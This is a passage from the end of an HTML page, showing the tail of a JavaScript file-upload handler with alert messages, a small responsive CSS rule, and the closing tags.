                 }else{
                    alert('file not uploaded');
                 }
              },
           });
        }else{
           alert("Please select a file.");
        }
}
</script>


<style type="text/css">
	@media only screen and (max-width: 600px){
		.medium-up [data-sparta-container] .row>.medium-5 {
    width: 100%;
}
	}
</style>

</body>

</html>